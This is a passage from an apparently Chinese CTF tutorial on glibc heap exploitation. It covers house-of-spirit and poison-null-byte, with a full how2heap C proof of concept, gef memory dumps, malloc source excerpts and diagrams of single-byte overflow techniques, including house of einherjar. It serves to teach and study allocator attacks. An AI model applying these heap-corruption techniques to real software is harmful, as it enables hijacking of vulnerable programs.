= P; */ mchunkptr old = *fb, old2; [...] do { [...] p->fd = old2 = old; } while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); \u5176\u4e2d\u4e0b\u9762\u7684\u5b8f\u51fd\u6570\u7528\u4e8e\u83b7\u5f97 next chunk\uff1a /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr) (((char *) (p)) + (s))) \u7136\u540e\u4fee\u6539\u6307\u9488 a \u6307\u5411 (fake chunk 1 + 0x10) \u7684\u4f4d\u7f6e\uff0c\u5373\u4e0a\u9762\u63d0\u5230\u7684 mem \u3002\u7136\u540e\u5c06\u5176\u4f20\u9012\u7ed9 free \u51fd\u6570\uff0c\u8fd9\u65f6\u7a0b\u5e8f\u5c31\u4f1a\u8bef\u4ee5\u4e3a\u8fd9\u662f\u4e00\u5757\u771f\u7684 chunk\uff0c\u7136\u540e\u5c06\u5176\u91ca\u653e\u5e76\u52a0\u5165\u5230 fastbin \u4e2d\u3002 gef\u27a4 x/gx &a 0x7fffffffdca0: 0x00007fffffffdcc0 gef\u27a4 x/10gx &fake_chunks 0x7fffffffdcb0: 0x0000000000000000 0x0000000000000020 <-- fake chunk 1 [be freed] 0x7fffffffdcc0: 0x0000000000000000 0x0000000000000000 0x7fffffffdcd0: 0x0000000000000001 0x0000000000001234 <-- fake chunk 2 0x7fffffffdce0: 0x4141414141414141 0x0000000000000000 0x7fffffffdcf0: 0x0000000000400820 0x00000000004005b0 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x7fffffffdcc0, size=0x20, flags=) \u8fd9\u65f6\u5982\u679c\u6211\u4eec malloc \u4e00\u4e2a\u5bf9\u5e94\u5927\u5c0f\u7684 fast chunk\uff0c\u7a0b\u5e8f\u5c06\u4ece fastbins \u4e2d\u5206\u914d\u51fa\u8fd9\u5757\u88ab\u91ca\u653e\u7684 chunk\u3002 gef\u27a4 x/10gx &fake_chunks 0x7fffffffdcb0: 0x0000000000000000 0x0000000000000020 <-- new chunk 0x7fffffffdcc0: 0x4242424242424242 0x0000000000000000 0x7fffffffdcd0: 0x0000000000000001 0x0000000000001234 <-- fake chunk 2 0x7fffffffdce0: 0x4141414141414141 0x0000000000000000 0x7fffffffdcf0: 0x0000000000400820 0x00000000004005b0 gef\u27a4 x/gx &b 0x7fffffffdca8: 0x00007fffffffdcc0 \u6240\u4ee5 house-of-spirit \u7684\u4e3b\u8981\u76ee\u7684\u662f\uff0c\u5f53\u6211\u4eec\u4f2a\u9020\u7684 fake chunk \u5185\u90e8\u5b58\u5728\u4e0d\u53ef\u63a7\u533a\u57df\u65f6\uff0c\u8fd0\u7528\u8fd9\u4e00\u6280\u672f\u53ef\u4ee5\u5c06\u8fd9\u7247\u533a\u57df\u53d8\u6210\u53ef\u63a7\u7684\u3002\u4e0a\u9762\u4e3a\u4e86\u65b9\u4fbf\u89c2\u5bdf\uff0c\u5728 fake chunk \u91cc\u586b\u5145\u4e00\u4e9b\u5b57\u6bcd\uff0c\u4f46\u5728\u73b0\u5b9e\u4e2d\u8fd9\u4e9b\u4f4d\u7f6e\u5f88\u53ef\u80fd\u662f\u4e0d\u53ef\u63a7\u7684\uff0c\u800c house-of-spirit \u4e5f\u6b63\u662f\u4ee5\u6b64\u4e3a\u76ee\u7684\u800c\u51fa\u73b0\u7684\u3002 \u8be5\u6280\u672f\u7684\u7f3a\u70b9\u4e5f\u662f\u9700\u8981\u5bf9\u6808\u5730\u5740\u8fdb\u884c\u6cc4\u6f0f\uff0c\u5426\u5219\u65e0\u6cd5\u6b63\u786e\u8986\u76d6\u9700\u8981\u91ca\u653e\u7684\u5806\u6307\u9488\uff0c\u4e14\u5728\u6784\u9020\u6570\u636e\u65f6\uff0c\u9700\u8981\u6ee1\u8db3\u5bf9\u9f50\u7684\u8981\u6c42\u7b49\u3002 \u52a0\u4e0a\u5185\u5b58\u68c0\u6d4b\u53c2\u6570\u91cd\u65b0\u7f16\u8bd1\uff0c\u53ef\u4ee5\u770b\u5230\u95ee\u9898\u6240\u5728\uff0c\u5373\u5c1d\u8bd5 free \u4e00\u5757\u4e0d\u662f\u7531 malloc \u5206\u914d\u7684 chunk\uff1a $ gcc -fsanitize=address -g house_of_spirit.c $ ./a.out We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks. The first one: 0x7fffa61d6c00 The second one: 0x7fffa61d6c20 Overwritting our pointer with the address of the fake region inside the fake first chunk, 0x7fffa61d6c00. Freeing the overwritten pointer. ================================================================= ==5282==ERROR: AddressSanitizer: attempting free on address which was not malloc()-ed: 0x7fffa61d6c10 in thread T0 #0 0x7fc4c3a332ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca) #1 0x400cab in main /home/firmyy/how2heap/house_of_spirit.c:24 #2 0x7fc4c35f182f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #3 0x4009b8 in _start (/home/firmyy/how2heap/a.out+0x4009b8) house-of-spirit \u5728 libc-2.26 \u4e0b\u7684\u5229\u7528\u53ef\u4ee5\u67e5\u770b\u7ae0\u8282 4.14\u3002 3.1.7 Linux \u5806\u5229\u7528\uff08\u4e2d\uff09 how2heap poison_null_byte house_of_lore overlapping_chunks overlapping_chunks_2 \u4e0b\u8f7d\u6587\u4ef6 how2heap poison_null_byte #include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> #include <malloc.h> int main() { uint8_t *a, *b, *c, *b1, *b2, *d; a = (uint8_t*) malloc(0x10); int real_a_size = malloc_usable_size(a); fprintf(stderr, \"We allocate 0x10 bytes for 'a': %p\\n\", a); fprintf(stderr, \"'real' size of 'a': %#x\\n\", real_a_size); b = (uint8_t*) malloc(0x100); c = (uint8_t*) malloc(0x80); fprintf(stderr, \"b: %p\\n\", b); fprintf(stderr, \"c: %p\\n\", c); uint64_t* b_size_ptr = (uint64_t*)(b - 0x8); *(size_t*)(b+0xf0) = 0x100; fprintf(stderr, \"b.size: %#lx ((0x100 + 0x10) | prev_in_use)\\n\\n\", *b_size_ptr); // deal with tcache // int *k[10], i; // for (i = 0; i < 7; i++) { // k[i] = malloc(0x100); // } // for (i = 0; i < 7; i++) { // free(k[i]); // } free(b); uint64_t* c_prev_size_ptr = ((uint64_t*)c) - 2; fprintf(stderr, \"After free(b), c.prev_size: %#lx\\n\", *c_prev_size_ptr); a[real_a_size] = 0; // <--- THIS IS THE \"EXPLOITED BUG\" fprintf(stderr, \"We overflow 'a' with a single null byte into the metadata of 'b'\\n\"); fprintf(stderr, \"b.size: %#lx\\n\\n\", *b_size_ptr); fprintf(stderr, \"Pass the check: chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\\n\", *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8)))); b1 = malloc(0x80); memset(b1, 'A', 0x80); fprintf(stderr, \"We malloc 'b1': %p\\n\", b1); fprintf(stderr, \"c.prev_size: %#lx\\n\", *c_prev_size_ptr); fprintf(stderr, \"fake c.prev_size: %#lx\\n\\n\", *(((uint64_t*)c)-4)); b2 = malloc(0x40); memset(b2, 'A', 0x40); fprintf(stderr, \"We malloc 'b2', our 'victim' chunk: %p\\n\", b2); // deal with tcache // for (i = 0; i < 7; i++) { // k[i] = malloc(0x80); // } // for (i = 0; i < 7; i++) { // free(k[i]); // } free(b1); free(c); fprintf(stderr, \"Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\\n\"); d = malloc(0x110); fprintf(stderr, \"Finally, we allocate 'd', overlapping 'b2': %p\\n\\n\", d); fprintf(stderr, \"b2 content:%s\\n\", b2); memset(d, 'B', 0xb0); fprintf(stderr, \"New b2 content:%s\\n\", b2); } $ gcc -g poison_null_byte.c $ ./a.out We allocate 0x10 bytes for 'a': 0xabb010 'real' size of 'a': 0x18 b: 0xabb030 c: 0xabb140 b.size: 0x111 ((0x100 + 0x10) | prev_in_use) After free(b), c.prev_size: 0x110 We overflow 'a' with a single null byte into the metadata of 'b' b.size: 0x100 Pass the check: chunksize(P) == 0x100 == 0x100 == prev_size (next_chunk(P)) We malloc 'b1': 0xabb030 c.prev_size: 0x110 fake c.prev_size: 0x70 We malloc 'b2', our 'victim' chunk: 0xabb0c0 Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2'). Finally, we allocate 'd', overlapping 'b2': 0xabb030 b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA New b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \u8be5\u6280\u672f\u9002\u7528\u7684\u573a\u666f\u9700\u8981\u67d0\u4e2a malloc \u7684\u5185\u5b58\u533a\u57df\u5b58\u5728\u4e00\u4e2a\u5355\u5b57\u8282\u6ea2\u51fa\u6f0f\u6d1e\u3002\u901a\u8fc7\u6ea2\u51fa\u4e0b\u4e00\u4e2a chunk \u7684 size \u5b57\u6bb5\uff0c\u653b\u51fb\u8005\u80fd\u591f\u5728\u5806\u4e2d\u521b\u9020\u51fa\u91cd\u53e0\u7684\u5185\u5b58\u5757\uff0c\u4ece\u800c\u8fbe\u5230\u6539\u5199\u5176\u4ed6\u6570\u636e\u7684\u76ee\u7684\u3002\u518d\u7ed3\u5408\u5176\u4ed6\u7684\u5229\u7528\u65b9\u5f0f\uff0c\u540c\u6837\u80fd\u591f\u83b7\u5f97\u7a0b\u5e8f\u7684\u63a7\u5236\u6743\u3002 \u5bf9\u4e8e\u5355\u5b57\u8282\u6ea2\u51fa\u7684\u5229\u7528\u6709\u4e0b\u9762\u51e0\u79cd\uff1a \u6269\u5c55\u88ab\u91ca\u653e\u5757\uff1a\u5f53\u6ea2\u51fa\u5757\u7684\u4e0b\u4e00\u5757\u4e3a\u88ab\u91ca\u653e\u5757\u4e14\u5904\u4e8e unsorted bin \u4e2d\uff0c\u5219\u901a\u8fc7\u6ea2\u51fa\u4e00\u4e2a\u5b57\u8282\u6765\u5c06\u5176\u5927\u5c0f\u6269\u5927\uff0c\u4e0b\u6b21\u53d6\u5f97\u6b21\u5757\u65f6\u5c31\u610f\u5473\u7740\u5176\u540e\u7684\u5757\u5c06\u88ab\u8986\u76d6\u800c\u9020\u6210\u8fdb\u4e00\u6b65\u7684\u6ea2\u51fa 0x100 0x100 0x80 |-------|-------|-------| | A | B | C | \u521d\u59cb\u72b6\u6001 |-------|-------|-------| | A | B | C | \u91ca\u653e B |-------|-------|-------| | A | B | C | \u6ea2\u51fa B \u7684 size \u4e3a 0x180 |-------|-------|-------| | A | B | C | malloc(0x180-8) |-------|-------|-------| C \u5757\u88ab\u8986\u76d6 |<--\u5b9e\u9645\u5f97\u5230\u7684\u5757->| \u6269\u5c55\u5df2\u5206\u914d\u5757\uff1a\u5f53\u6ea2\u51fa\u5757\u7684\u4e0b\u4e00\u5757\u4e3a\u4f7f\u7528\u4e2d\u7684\u5757\uff0c\u5219\u9700\u8981\u5408\u7406\u63a7\u5236\u6ea2\u51fa\u7684\u5b57\u8282\uff0c\u4f7f\u5176\u88ab\u91ca\u653e\u65f6\u7684\u5408\u5e76\u64cd\u4f5c\u80fd\u591f\u987a\u5229\u8fdb\u884c\uff0c\u4f8b\u5982\u76f4\u63a5\u52a0\u4e0a\u4e0b\u4e00\u5757\u7684\u5927\u5c0f\u4f7f\u5176\u5b8c\u5168\u88ab\u8986\u76d6\u3002\u4e0b\u4e00\u6b21\u5206\u914d\u5bf9\u5e94\u5927\u5c0f\u65f6\uff0c\u5373\u53ef\u53d6\u5f97\u5df2\u7ecf\u88ab\u6269\u5927\u7684\u5757\uff0c\u5e76\u9020\u6210\u8fdb\u4e00\u6b65\u6ea2\u51fa 0x100 0x100 0x80 |-------|-------|-------| | A | B | C | \u521d\u59cb\u72b6\u6001 |-------|-------|-------| | A | B | C | \u6ea2\u51fa B \u7684 size \u4e3a 0x180 |-------|-------|-------| | A | B | C | \u91ca\u653e B |-------|-------|-------| | A | B | C | malloc(0x180-8) |-------|-------|-------| C \u5757\u88ab\u8986\u76d6 |<--\u5b9e\u9645\u5f97\u5230\u7684\u5757->| \u6536\u7f29\u88ab\u91ca\u653e\u5757\uff1a\u6b64\u60c5\u51b5\u9488\u5bf9\u6ea2\u51fa\u7684\u5b57\u8282\u53ea\u80fd\u4e3a 0 \u7684\u65f6\u5019\uff0c\u4e5f\u5c31\u662f\u672c\u8282\u6240\u8bf4\u7684 poison-null-byte\uff0c\u6b64\u65f6\u5c06\u4e0b\u4e00\u4e2a\u88ab\u91ca\u653e\u7684\u5757\u5927\u5c0f\u7f29\u5c0f\uff0c\u5982\u6b64\u4e00\u6765\u5728\u4e4b\u540e\u5206\u88c2\u6b64\u5757\u65f6\u5c06\u65e0\u6cd5\u6b63\u786e\u66f4\u65b0\u540e\u4e00\u5757\u7684 prev_size \u5b57\u6bb5\uff0c\u5bfc\u81f4\u91ca\u653e\u65f6\u51fa\u73b0\u91cd\u53e0\u7684\u5806\u5757 0x100 0x210 0x80 |-------|---------------|-------| | A | B | C | \u521d\u59cb\u72b6\u6001 |-------|---------------|-------| | A | B | C | \u91ca\u653e B |-------|---------------|-------| | A | B | C | \u6ea2\u51fa B \u7684 size \u4e3a 0x200 |-------|---------------|-------| \u4e4b\u540e\u7684 malloc \u64cd\u4f5c\u6ca1\u6709\u66f4\u65b0 C \u7684 prev_size 0x100 0x80 |-------|------|-----|--|-------| | A | B1 | B2 | | C | malloc(0x180-8), malloc(0x80-8) |-------|------|-----|--|-------| | A | B1 | B2 | | C | \u91ca\u653e B1 |-------|------|-----|--|-------| | A | B1 | B2 | | C | \u91ca\u653e C\uff0cC \u5c06\u4e0e B1 \u5408\u5e76 |-------|------|-----|--|-------| | A | B1 | B2 | | C | malloc(0x180-8) |-------|------|-----|--|-------| B2 \u5c06\u88ab\u8986\u76d6 |<\u5b9e\u9645\u5f97\u5230\u7684\u5757>| house of einherjar\uff1a\u4e5f\u662f\u6ea2\u51fa\u5b57\u8282\u53ea\u80fd\u4e3a 0 \u7684\u60c5\u51b5\uff0c\u5f53\u5b83\u662f\u66f4\u65b0\u6ea2\u51fa\u5757\u4e0b\u4e00\u5757\u7684 prev_size \u5b57\u6bb5\uff0c\u4f7f\u5176\u5728\u88ab\u91ca\u653e\u65f6\u80fd\u591f\u627e\u5230\u4e4b\u524d\u4e00\u4e2a\u5408\u6cd5\u7684\u88ab\u91ca\u653e\u5757\u5e76\u4e0e\u5176\u5408\u5e76\uff0c\u9020\u6210\u5806\u5757\u91cd\u53e0 0x100 0x100 0x101 |-------|-------|-------| | A | B | C | \u521d\u59cb\u72b6\u6001 |-------|-------|-------| | A | B | C | \u91ca\u653e A |-------|-------|-------| | A | B | C | \u6ea2\u51fa B\uff0c\u8986\u76d6 C \u5757\u7684 size \u4e3a 0x200\uff0c\u5e76\u4f7f\u5176 prev_size \u4e3a 0x200 |-------|-------|-------| | A | B | C | \u91ca\u653e C |-------|-------|-------| | A | B | C | C \u5c06\u4e0e A \u5408\u5e76 |-------|-------|-------| B \u5757\u88ab\u91cd\u53e0 |<-----\u5b9e\u9645\u5f97\u5230\u7684\u5757------>| \u9996\u5148\u5206\u914d\u4e09\u4e2a chunk\uff0c\u7b2c\u4e00\u4e2a chunk \u7c7b\u578b\u65e0\u6240\u8c13\uff0c\u4f46\u540e\u4e24\u4e2a\u4e0d\u80fd\u662f fast chunk\uff0c\u56e0\u4e3a fast chunk \u5728\u91ca\u653e\u540e\u4e0d\u4f1a\u88ab\u5408\u5e76\u3002\u8fd9\u91cc chunk a \u7528\u4e8e\u5236\u9020\u5355\u5b57\u8282\u6ea2\u51fa\uff0c\u53bb\u8986\u76d6 chunk b \u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\uff0cchunk c \u7684\u4f5c\u7528\u662f\u5e2e\u52a9\u4f2a\u9020 fake chunk\u3002 \u9996\u5148\u662f\u6ea2\u51fa\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u77e5\u9053\u4e00\u4e2a\u5806\u5757\u5b9e\u9645\u53ef\u7528\u7684\u5185\u5b58\u5927\u5c0f\uff08\u56e0\u4e3a\u7a7a\u95f4\u590d\u7528\uff0c\u53ef\u80fd\u4f1a\u6bd4\u5206\u914d\u65f6\u8981\u5927\u4e00\u70b9\uff09\uff0c\u7528\u4e8e\u83b7\u5f97\u8be5\u5927\u5c0f\u7684\u51fd\u6570 malloc_usable_size \u5982\u4e0b\uff1a /* ------------------------- malloc_usable_size ------------------------- */ static size_t musable (void *mem) { mchunkptr p; if (mem != 0) { p = mem2chunk (mem); [...] if (chunk_is_mmapped (p)) return chunksize (p) - 2 * SIZE_SZ; else if (inuse (p)) return chunksize (p) - SIZE_SZ; } return 0; } /* check for mmap()'ed chunk */ #define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED) /* extract p's inuse bit */ #define inuse(p) \\ ((((mchunkptr) (((char *) (p)) + ((p)->size & ~SIZE_BITS)))->size) & PREV_INUSE) /* Get size, ignoring use bits */ #define chunksize(p) ((p)->size & ~(SIZE_BITS)) \u6240\u4ee5 real_a_size = chunksize(a) - 0x8 == 0x18 \u3002\u53e6\u5916\u9700\u8981\u6ce8\u610f\u7684\u662f\u7a0b\u5e8f\u662f\u901a\u8fc7 next chunk \u7684 PREV_INUSE \u6807\u5fd7\u6765\u5224\u65ad\u67d0 chunk \u662f\u5426\u88ab\u4f7f\u7528\u7684\u3002 \u4e3a\u4e86\u5728\u4fee\u6539 chunk b \u7684 size \u5b57\u6bb5\u540e\uff0c\u4f9d\u7136\u80fd\u901a\u8fc7 unlink \u7684\u68c0\u67e5\uff0c\u6211\u4eec\u9700\u8981\u4f2a\u9020\u4e00\u4e2a c.prev_size \u5b57\u6bb5\uff0c\u5b57\u6bb5\u7684\u5927\u5c0f\u662f\u5f88\u597d\u8ba1\u7b97\u7684\uff0c\u5373 0x100 == (0x111 & 0xff00) \uff0c\u6b63\u597d\u662f NULL \u5b57\u8282\u6ea2\u51fa\u540e\u7684\u503c\u3002\u7136\u540e\u628a chunk b \u91ca\u653e\u6389\uff0cchunk b \u968f\u540e\u88ab\u653e\u5230 unsorted bin \u4e2d\uff0c\u5927\u5c0f\u662f 0x110\u3002\u6b64\u65f6\u7684\u5806\u5e03\u5c40\u5982\u4e0b\uff1a gef\u27a4 x/42gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x0000000000000000 0x0000000000000000 0x603020: 0x0000000000000000 0x0000000000000111 <-- chunk b [be freed] 0x603030: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x603040: 0x0000000000000000 0x0000000000000000 0x603050: 0x0000000000000000 0x0000000000000000 0x603060: 0x0000000000000000 0x0000000000000000 0x603070: 0x0000000000000000 0x0000000000000000 0x603080: 0x0000000000000000 0x0000000000000000 0x603090: 0x0000000000000000 0x0000000000000000 0x6030a0: 0x0000000000000000 0x0000000000000000 0x6030b0: 0x0000000000000000 0x0000000000000000 0x6030c0: 0x0000000000000000 0x0000000000000000 0x6030d0: 0x0000000000000000 0x0000000000000000 0x6030e0: 0x0000000000000000 0x0000000000000000 0x6030f0: 0x0000000000000000 0x0000000000000000 0x603100: 0x0000000000000000 0x0000000000000000 0x603110: 0x0000000000000000 0x0000000000000000 0x603120: 0x0000000000000100 0x0000000000000000 <-- fake c.prev_size 0x603130: 0x0000000000000110 0x0000000000000090 <-- chunk c 0x603140: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x603020, bk=0x603020 \u2192 Chunk(addr=0x603030, size=0x110, flags=PREV_INUSE) \u6700\u5173\u952e\u7684\u4e00\u6b65\uff0c\u901a\u8fc7\u6ea2\u51fa\u6f0f\u6d1e\u8986\u5199 chunk b \u7684\u6570\u636e\uff1a gef\u27a4 x/42gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x0000000000000000 0x0000000000000000 0x603020: 0x0000000000000000 0x0000000000000100 <-- chunk b [be freed] 0x603030: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x603040: 0x0000000000000000 0x0000000000000000 0x603050: 0x0000000000000000 0x0000000000000000 0x603060: 0x0000000000000000 0x0000000000000000 0x603070: 0x0000000000000000 0x0000000000000000 0x603080: 0x0000000000000000 0x0000000000000000 0x603090: 0x0000000000000000 0x0000000000000000 0x6030a0: 0x0000000000000000 0x0000000000000000 0x6030b0: 0x0000000000000000 0x0000000000000000 0x6030c0: 0x0000000000000000 0x0000000000000000 0x6030d0: 0x0000000000000000 0x0000000000000000 0x6030e0: 0x0000000000000000 0x0000000000000000 0x6030f0: 0x0000000000000000 0x0000000000000000 0x603100: 0x0000000000000000 0x0000000000000000 0x603110: 0x0000000000000000 0x0000000000000000 0x603120: 0x0000000000000100 0x0000000000000000 <-- fake c.prev_size 0x603130: 0x0000000000000110 0x0000000000000090 <-- chunk c 0x603140: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x603020, bk=0x603020 \u2192 Chunk(addr=0x603030, size=0x100, flags=) \u8fd9\u65f6\uff0c\u6839\u636e\u6211\u4eec\u4e0a\u4e00\u7bc7\u6587\u5b57\u4e2d\u8bb2\u5230\u7684\u8ba1\u7b97\u65b9\u6cd5\uff1a chunksize(P) == *((size_t*)(b-0x8)) & (~ 0x7) == 0x100 prev_size (next_chunk(P)) == *(size_t*)(b-0x10 + 0x100) == 0x100 \u53ef\u4ee5\u6210\u529f\u7ed5\u8fc7\u68c0\u67e5\u3002\u53e6\u5916 unsorted bin \u4e2d\u7684 chunk \u5927\u5c0f\u4e5f\u53d8\u6210\u4e86 0x100\u3002 \u63a5\u4e0b\u6765\u968f\u610f\u5206\u914d\u4e24\u4e2a chunk\uff0cmalloc \u4f1a\u4ece unsorted bin \u4e2d\u5212\u51fa\u5408\u9002\u5927\u5c0f\u7684\u5185\u5b58\u8fd4\u56de\u7ed9\u7528\u6237\uff1a gef\u27a4 x/42gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x0000000000000000 0x0000000000000000 0x603020: 0x0000000000000000 0x0000000000000091 <-- chunk b1 <-- fake chunk b 0x603030: 0x4141414141414141 0x4141414141414141 0x603040: 0x4141414141414141 0x4141414141414141 0x603050: 0x4141414141414141 0x4141414141414141 0x603060: 0x4141414141414141 0x4141414141414141 0x603070: 0x4141414141414141 0x4141414141414141 0x603080: 0x4141414141414141 0x4141414141414141 0x603090: 0x4141414141414141 0x4141414141414141 0x6030a0: 0x4141414141414141 0x4141414141414141 0x6030b0: 0x0000000000000000 0x0000000000000051 <-- chunk b2 <-- 'victim' chunk 0x6030c0: 0x4141414141414141 0x4141414141414141 0x6030d0: 0x4141414141414141 0x4141414141414141 0x6030e0: 0x4141414141414141 0x4141414141414141 0x6030f0: 0x4141414141414141 0x4141414141414141 0x603100: 0x0000000000000000 0x0000000000000021 <-- unsorted bin 0x603110: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x603120: 0x0000000000000020 0x0000000000000000 <-- fake c.prev_size 0x603130: 0x0000000000000110 0x0000000000000090 <-- chunk c 0x603140: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x603100, bk=0x603100 \u2192 Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE) \u8fd9\u91cc\u6709\u4e2a\u5f88\u6709\u8da3\u7684\u4e1c\u897f\uff0c\u5206\u914d\u5806\u5757\u540e\uff0c\u53d1\u751f\u53d8\u5316\u7684\u662f fake c.prev_size\uff0c\u800c\u4e0d\u662f c.prev_size\u3002\u6240\u4ee5 chunk c \u4f9d\u7136\u8ba4\u4e3a chunk b \u7684\u5730\u65b9\u6709\u4e00\u4e2a\u5927\u5c0f\u4e3a 0x110 \u7684 free chunk\u3002\u4f46\u5176\u5b9e\u8fd9\u7247\u5185\u5b58\u5df2\u7ecf\u88ab\u5206\u914d\u7ed9\u4e86 chunk b1\u3002 \u63a5\u4e0b\u6765\u662f\u89c1\u8bc1\u5947\u8ff9\u7684\u65f6\u523b\uff0c\u6211\u4eec\u77e5\u9053\uff0c\u4e24\u4e2a\u76f8\u90bb\u7684 small chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u5408\u5e76\u5728\u4e00\u8d77\u3002\u9996\u5148\u91ca\u653e chunk b1\uff0c\u4f2a\u9020\u51fa fake chunk b \u662f free chunk \u7684\u6837\u5b50\u3002\u7136\u540e\u91ca\u653e chunk c\uff0c\u8fd9\u65f6\u7a0b\u5e8f\u4f1a\u53d1\u73b0 chunk c \u7684\u524d\u4e00\u4e2a chunk \u662f\u4e00\u4e2a free chunk\uff0c\u7136\u540e\u5c31\u5c06\u5b83\u4eec\u5408\u5e76\u5728\u4e86\u4e00\u8d77\uff0c\u5e76\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u5408\u5e76\u8fdb\u4e86 top chunk\u3002\u53ef\u601c\u7684 chunk 2 \u4f4d\u4e8e chunk b1 \u548c chunk c \u4e4b\u95f4\uff0c\u88ab\u76f4\u63a5\u65e0\u89c6\u4e86\uff0c\u73b0\u5728 malloc \u8ba4\u4e3a\u8fd9\u6574\u5757\u533a\u57df\u90fd\u662f\u672a\u5206\u914d\u7684\uff0c\u65b0\u7684 top chunk \u6307\u9488\u5df2\u7ecf\u8bf4\u660e\u4e86\u4e00\u5207\u3002 gef\u27a4 x/42gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x0000000000000000 0x0000000000000000 0x603020: 0x0000000000000000 0x0000000000020fe1 <-- top chunk 0x603030: 0x0000000000603100 0x00007ffff7dd1b78 0x603040: 0x4141414141414141 0x4141414141414141 0x603050: 0x4141414141414141 0x4141414141414141 0x603060: 0x4141414141414141 0x4141414141414141 0x603070: 0x4141414141414141 0x4141414141414141 0x603080: 0x4141414141414141 0x4141414141414141 0x603090: 0x4141414141414141 0x4141414141414141 0x6030a0: 0x4141414141414141 0x4141414141414141 0x6030b0: 0x0000000000000090 0x0000000000000050 <-- chunk b2 <-- 'victim' chunk 0x6030c0: 0x4141414141414141 0x4141414141414141 0x6030d0: 0x4141414141414141 0x4141414141414141 0x6030e0: 0x4141414141414141 0x4141414141414141 0x6030f0: 0x4141414141414141 0x4141414141414141 0x603100: 0x0000000000000000 0x0000000000000021 <-- unsorted bin 0x603110: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x603120: 0x0000000000000020 0x0000000000000000 0x603130: 0x0000000000000110 0x0000000000000090 0x603140: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x603100, bk=0x603100 \u2192 Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE) chunk \u5408\u5e76\u7684\u8fc7\u7a0b\u5982\u4e0b\uff0c\u9996\u5148\u8be5 chunk \u4e0e\u524d\u4e00\u4e2a chunk \u5408\u5e76\uff0c\u7136\u540e\u68c0\u67e5\u4e0b\u4e00\u4e2a chunk \u662f\u5426\u4e3a top chunk\uff0c\u5982\u679c\u4e0d\u662f\uff0c\u5c06\u5408\u5e76\u540e\u7684 chunk \u653e\u56de unsorted bin \u4e2d\uff0c\u5426\u5219\uff0c\u5408\u5e76\u8fdb top chunk\uff1a /* consolidate backward */ if (!prev_inuse(p)) { prevsize = p->prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); } if (nextchunk != av->top) { /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ [...] } /* If the chunk borders the current high end of memory, consolidate into top */ else { size += nextsize; set_head(p, size | PREV_INUSE); av->top = p; check_chunk(av, p); } \u63a5\u4e0b\u6765\uff0c\u7533\u8bf7\u4e00\u5757\u5927\u7a7a\u95f4\uff0c\u5927\u5230\u53ef\u4ee5\u628a chunk b2 \u5305\u542b\u8fdb\u6765\uff0c\u8fd9\u6837 chunk b2 \u5c31\u5b8c\u5168\u88ab\u6211\u4eec\u63a7\u5236\u4e86\u3002 gef\u27a4 x/42gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x0000000000000000 0x0000000000000000 0x603020: 0x0000000000000000 0x0000000000000121 <-- chunk d 0x603030: 0x4242424242424242 0x4242424242424242 0x603040: 0x4242424242424242 0x4242424242424242 0x603050: 0x4242424242424242 0x4242424242424242 0x603060: 0x4242424242424242 0x4242424242424242 0x603070: 0x4242424242424242 0x4242424242424242 0x603080: 0x4242424242424242 0x4242424242424242 0x603090: 0x4242424242424242 0x4242424242424242 0x6030a0: 0x4242424242424242 0x4242424242424242 0x6030b0: 0x4242424242424242 0x4242424242424242 <-- chunk b2 <-- 'victim' chunk 0x6030c0: 0x4242424242424242 0x4242424242424242 0x6030d0: 0x4242424242424242 0x4242424242424242 0x6030e0: 0x4141414141414141 0x4141414141414141 0x6030f0: 0x4141414141414141 0x4141414141414141 0x603100: 0x0000000000000000 0x0000000000000021 <-- small bins 0x603110: 0x00007ffff7dd1b88 0x00007ffff7dd1b88 <-- fd, bk pointer 0x603120: 0x0000000000000020 0x0000000000000000 0x603130: 0x0000000000000110 0x0000000000000090 